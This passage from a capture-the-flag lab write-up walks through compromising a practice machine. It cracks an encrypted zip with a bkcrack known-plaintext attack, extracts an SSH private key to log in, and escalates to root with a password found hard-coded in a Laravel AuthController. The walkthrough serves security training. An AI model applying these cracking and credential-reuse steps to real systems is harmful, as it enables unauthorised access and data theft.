&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;bkcrack&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;C&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uploaded&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3422&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;zip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;.bash_logout&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;P&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;zip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;bash_logout&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We pass the &lt;em&gt;uploaded-file-3422.zip&lt;/em&gt; and also indicate the file‚Äôs name in the encrypted zip file that we have the copy in plain text.&lt;/p&gt;

&lt;p&gt;Then we pass the zip file we created with the &lt;strong&gt;bash_logout&lt;/strong&gt; that we have in plain text. (It could be other names, it doesn‚Äôt matter what matter is the content that needs to be the same or very identical)&lt;/p&gt;

&lt;p&gt;Then we need to wait until it gives us the keys that we could use to get the content of the encrypted file.&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;bkcrack&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;C&lt;/span&gt; &lt;span class=&quot;vg&quot;&gt;$encrypted_zip_file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt; &lt;span class=&quot;vg&quot;&gt;$key&lt;/span&gt; &lt;span class=&quot;vg&quot;&gt;$key&lt;/span&gt; &lt;span class=&quot;vg&quot;&gt;$key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;U&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;zip&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/ransom/11.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We created a new zip file with a password that is &lt;em&gt;‚Äúpassword‚Äù&lt;/em&gt; and will have the duplicated files as &lt;em&gt;uploaded-file-3422.zip&lt;/em&gt; thanks to the three keys we get.&lt;/p&gt;

&lt;p&gt;And then, we decrypt it with the password we put and get the content.&lt;/p&gt;

&lt;p&gt;We get the &lt;em&gt;id_rsa&lt;/em&gt;, but we need a user. To get the user see the &lt;em&gt;id_rsa.pub&lt;/em&gt;, and the user is &lt;em&gt;htb&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;So now we put the permissions to the id_rsa &lt;em&gt;chmod 600 id_rsa&lt;/em&gt; and connect to the machine &lt;strong&gt;ssh -i id_rsa htb@101.01.01.101&lt;/strong&gt;&lt;/p&gt;

&lt;h2 id=&quot;privelege-escalation&quot;&gt;Privelege escalation&lt;/h2&gt;

&lt;p&gt;In the web page we see that there is a login requesting a password and maybe that password could be reuse for the root user, so we start to search, but in the standard path ‚Äú/var/www/html‚Äù there is nothing.&lt;/p&gt;

&lt;p&gt;When we used &lt;strong&gt;whatweb&lt;/strong&gt;, we saw that the page is using apache and knowing that we could search this path &lt;strong&gt;/etc/apache2/default/sites-enabled/000-default.conf&lt;/strong&gt; to get information, and in fact, we see the root page is in the route &lt;em&gt;/srv/prod/public&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/ransom/12.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We go to the path and start looking for where password could be, but there are too many files to explore, to decrease the scope do this:&lt;/p&gt;

&lt;p&gt;You need to be in this path: &lt;em&gt;/srv/prod/&lt;/em&gt;&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;login&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/ransom/13.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And we find a login string that looks interesting ‚Äú&lt;strong&gt;routes/api.php&lt;/strong&gt;‚Äù.&lt;/p&gt;

&lt;p&gt;Viewing the &lt;em&gt;api.php&lt;/em&gt; we see something interesting ‚Äú&lt;strong&gt;AuthController::class&lt;/strong&gt;‚Äù.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/ransom/14.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Viewing the file ‚Äú&lt;strong&gt;app/Http/Controllers/AuthController.php&lt;/strong&gt;‚Äù we get the password.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/ransom/15.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We test it with the root user and that‚Äôs his password.&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;su&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And now we are root :)&lt;/p&gt;</content><author><name>FmF</name></author><summary type="html"></summary></entry></feed>